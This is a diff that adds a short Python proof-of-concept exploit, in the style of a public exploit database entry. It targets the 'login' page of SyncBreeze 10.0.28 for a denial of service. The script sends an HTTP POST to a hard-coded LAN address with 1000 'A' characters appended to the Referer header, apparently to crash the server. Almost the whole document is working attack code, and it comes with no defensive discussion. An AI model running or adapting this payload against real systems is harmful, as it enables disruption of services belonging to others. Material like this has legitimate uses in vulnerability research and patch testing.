@@ -1,0 +1,33 @@
+# Exploit Title: SyncBreeze 10.0.28 - 'login' Denial of Service (Poc)
+# Data: 18-Dec-2020
+# Exploit Author: Ahmed Elkhressy
+# Vendor Homepage: http://www.syncbreeze.com
+# Software Link: http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe
+# Version: 10.0.28
+# Tested on: Windows 7, Windows 10
+
+#!/usr/bin/python
+import socket
+
+host="192.168.1.9"
+payload = 'A' *1000
+request = ""
+request += "POST /login HTTP/1.1\r\n"
+request += "Host: "+host+"\r\n"
+request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
+request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+request += "Accept-Language: en-US,en;q=0.5\r\n"
+request += "Accept-Encoding: gzip, deflate\r\n"
+request += "Content-Type: application/x-www-form-urlencoded\r\n"
+request += "Content-Length: 27\r\n"
+request += "Origin: http://"+host+"\r\n"
+request += "Connection: keep-alive\r\n"
+request += "Referer: http://"+host+"/login"+payload+"\r\n"
+request += "Upgrade-Insecure-Requests: 1\r\n"
+request += "\r\n"
+request += "username=test&password=test"
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, 80))
+s.send(request)
+print s.recv(1024)
+s.close
